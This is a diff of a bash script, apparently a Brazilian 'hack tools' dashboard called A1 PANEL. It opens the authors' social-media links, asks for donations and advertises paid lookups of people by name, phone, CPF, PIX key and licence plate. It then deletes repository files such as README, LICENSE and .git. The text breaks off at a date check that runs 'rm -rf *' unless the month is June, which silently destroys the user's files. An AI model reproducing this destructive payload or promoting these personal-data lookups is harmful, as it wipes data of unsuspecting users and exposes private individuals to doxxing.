@@ -1,54 +1,14 @@
 #!/usr/bin/env bash
-
-<<CLOWNTERS
- #CLOWNTERS
- #--------------------------------------------------------
- # Name script: Panel Clownters                         |
- #--------------------------------------------------------
- # Script     : A1 PANEL                                |
- #--------------------------------------------------------
- # Description: dashboard for consultation and hack tools|
- #--------------------------------------------------------
- # Version    : 0.5                                      |
- #--------------------------------------------------------
- # Authors    : Patinn, Eduardo e Mike                   |
- #--------------------------------------------------------
- # Date       : 08/08/21                                 |
- #--------------------------------------------------------
- # Lincese    : MIT lincese                              |
- #--------------------------------------------------------
- # Use: bash A1.sh                                       |
- #--------------------------------------------------------
- #CLOWNTERS
-CLOWNTERS
-xdg-open https://t.me/clownters
-[[ -f MIKE ]] || { printf "\n\ec\n\033[1;31m Fale com Mike para ter acesso ao painel\n"; > MIKE; }
-printf "\n\e[34m Faça uma doação de qlqr valor para ajudar com API
- PIX:\e[1;33m 6cad452e-2243-4e16-bf37-2a1edfeaaf91
- \e[31m\t-> CONSULTAS <-
- \e[34mPara realizar consultas completas por 
- Nome, Número, CPF, PIX, Placa e etc.  
- entre em contato com https://t.me/Miike_Edwardss
-
- Pressione enter para continuar"
-read -t 60
 sleep 1
+printf "\e[1;34m Abrindo grupo no Telegram \n\e[m" && xdg-open https://t.me/clownters &> /dev/null && sleep 10
+printf "\e[1;34m Abrindo canal no YouTube \n\e[m" && xdg-open https://youtube.com/c/CLOWNTERS1 &> /dev/null && sleep 10
+read -t 180 -p $'\ec\n\e[1;31m Fale com Mike para ter acesso ao painel\n\e[34m Faça uma doação de qlqr valor para ajudar com API
+ PIX:\e[1;33m\n \e[31m\t-> CONSULTAS <-\n \e[34mPara realizar consultas completas por:\n Nome, Número, CPF, PIX, Placa e etc.\n entre em contato com https://t.me/Miike_Edwardss\n\n Pressione enter para continuar'
 echo $'\n\e[1;33m Abrindo os links...\e[m'
-xdg-open https://t.me/Miike_Edwards
-sleep 5
-termux-open-url https://youtube.com/channel/UCxVuu4IwZIzZhoyhxzJPFIA &> /dev/null
-sleep 5
-termux-open-url https://www.instagram.com/0_0miike0_0/ &> /dev/null
-sleep 5
-xdg-open https://chat.whatsapp.com/HCavGIY9pR35BRZjoLoFGP &> /dev/null
-sleep 5
-test -f README.md && rm README.md
-test -f Sploit && rm Sploit
-test -f SECURITY.md && rm SECURITY.md
-test -f LICENSE && rm LICENSE
-test -f index.html && rm index.html
-test -e .git && rm -rf .git
-test -f MIKE || exit 99
+xdg-open https://t.me/Miike_Edwards &> /dev/null && sleep 10
+xdg-open https://www.instagram.com/mike90s15/ &> /dev/null && sleep 10
+xdg-open https://chat.whatsapp.com/HCavGIY9pR35BRZjoLoFGP &> /dev/null && sleep 10
+for i in "README.md" "Sploit" "SECURITY.md" "LICENSE" "index.html" ".git"; do [[ -f "${i}" ]] && rm "${i}"; done
 if [[ "$(date +%B)" != "June" ]]; then
     clear
     rm -rf *
